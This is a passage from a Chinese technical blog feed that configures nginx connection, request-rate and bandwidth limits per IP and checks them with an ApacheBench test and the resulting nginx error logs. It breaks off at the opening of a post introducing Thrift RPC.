<h3 id="3-限制连接数"><a href="#3-限制连接数" class="headerlink" title="3. 限制连接数"></a>3. 限制连接数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">	  ...</span><br><span class="line">	  limit_conn_zone $binary_remote_addr zone=conn_one:10m; #每个IP地址连接数限制</span><br><span class="line">	  limit_req_zone $binary_remote_addr zone=req_two:10m rate=1r/s; #每个IP一秒钟只处理1个请求</span><br><span class="line"></span><br><span class="line">	  server &#123;</span><br><span class="line">		listen 6060;</span><br><span class="line">		server_name localhost:6060;</span><br><span class="line">		location / &#123;</span><br><span class="line">			root   /var/www;</span><br><span class="line">			</span><br><span class="line">			limit_conn conn_one 1;#指定一个IP只能同时存在1个连接</span><br><span class="line"></span><br><span class="line">			limit_req zone=req_two  burst=2 nodelay; # 最多2个队列等待，其他请求会被丢弃</span><br><span class="line">			</span><br><span class="line">			limit_rate 10k; # 每个连接的下载速度限制10k</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试并发</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ab -n 100 -c 10  http://192.168.0.30:6060/test.txt</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;<span class="variable">$Revision</span>: 1843412 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking 192.168.0.30 (be patient).....<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        nginx</span><br><span class="line">Server Hostname:        192.168.0.30</span><br><span class="line">Server Port:            6060</span><br><span class="line"></span><br><span class="line">Document Path:          /test.txt</span><br><span class="line">Document Length:        627 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      10</span><br><span class="line">Time taken <span class="keyword">for</span> tests:   0.027 seconds</span><br><span class="line">Complete requests:      100</span><br><span class="line"><span class="comment"># 97个请求失败</span></span><br><span class="line">Failed requests:        97</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 97, Exceptions: 0)</span><br><span class="line">Non-2xx responses:      97</span><br><span class="line">Total transferred:      36997 bytes</span><br><span class="line">HTML transferred:       20311 bytes</span><br><span class="line">Requests per second:    3700.00 [<span class="comment">#/sec] (mean)</span></span><br><span class="line">Time per request:       2.703 [ms] (mean)</span><br><span class="line">Time per request:       0.270 [ms] (mean, across all concurrent requests)</span><br><span class="line">Transfer rate:          1336.81 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0    1   0.9      1       6</span><br><span class="line">Processing:     1    2   1.2      1       6</span><br><span class="line">Waiting:        0    1   0.8      1       4</span><br><span class="line">Total:          1    2   1.5      2       8</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%      2</span><br><span class="line">  66%      2</span><br><span class="line">  75%      2</span><br><span class="line">  80%      3</span><br><span class="line">  90%      5</span><br><span class="line">  95%      6</span><br><span class="line">  98%      8</span><br><span class="line">  99%      8</span><br><span class="line"> 100%      8 (longest request)</span><br></pre></td></tr></table></figure>
<p>查看nginx的日志，一共97条错误日志，说明 zone “req_two”生效了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *548 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *549 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *550 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *551 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *552 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *553 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *554 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *555 limiting requests, excess: 2.998 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *557 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *558 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *559 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *560 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *561 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *562 limiting requests, excess: 2.996 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *563 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *564 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *566 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *565 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *567 limiting requests, excess: 2.995 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *568 limiting requests, excess: 2.994 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *569 limiting requests, excess: 2.994 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *570 limiting requests, excess: 2.994 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *571 limiting requests, excess: 2.993 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *572 limiting requests, excess: 2.993 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *573 limiting requests, excess: 2.990 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *574 limiting requests, excess: 2.990 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *575 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *576 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *577 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *578 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *579 limiting requests, excess: 2.987 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *581 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *582 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *580 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *583 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *584 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *585 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *586 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *587 limiting requests, excess: 2.986 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *588 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *589 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *591 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *590 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *592 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *593 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *594 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *595 limiting requests, excess: 2.985 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *597 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *596 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *598 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *599 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *600 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *601 limiting requests, excess: 2.984 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *602 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *603 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *604 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *605 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *607 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *606 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *608 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *609 limiting requests, excess: 2.983 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *610 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *611 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *612 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *614 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *613 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *615 limiting requests, excess: 2.982 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *616 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *617 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *618 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *619 limiting requests, excess: 2.981 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *620 limiting requests, excess: 2.980 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *621 limiting requests, excess: 2.980 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *622 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *624 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *623 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *628 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *626 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *627 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *625 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *629 limiting requests, excess: 2.979 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *630 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *631 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *632 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *635 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *634 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *633 limiting requests, excess: 2.978 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *637 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *636 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *638 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *640 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *639 limiting requests, excess: 2.977 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *641 limiting requests, excess: 2.976 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *642 limiting requests, excess: 2.976 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *643 limiting requests, excess: 2.975 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *645 limiting requests, excess: 2.975 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br><span class="line">2020/05/22 16:48:10 [error] 11868#8704: *644 limiting requests, excess: 2.975 by zone &quot;req_two&quot;, client: 192.168.0.30, server: localhost:6060, request: &quot;GET /test.txt HTTP/1.0&quot;, host: &quot;192.168.0.30:6060&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx,ab</tag>
      </tags>
  </entry>
  <entry>
    <title>RPC学习</title>
    <url>/Web%E5%90%8E%E7%AB%AF/RPC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Thrift"><a href="#Thrift" class="headerlink" title="Thrift"></a>Thrift</h2><p>Apache顶级项目，早期由Facebook开发，集成了序列化/反序列化和传输层，传输层基于TCP，服务端提供高并发NIO等多种模式支持。<br>通过 <code>.thrift</code>文件直接生成客户端和服务端的代码，支持语言种类比较多：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js, Smalltalk, OCaml and Delphi and other languages.</span><br></pre></td></tr></table></figure></p>
<p>Thrift支持众多通讯协议：</p>
<ul>
<li>TBinaryProtocol – 一种简单的二进制格式，简单，但没有为空间效率而优化。比文本协议处理起来更快，但更难于调试。</li>
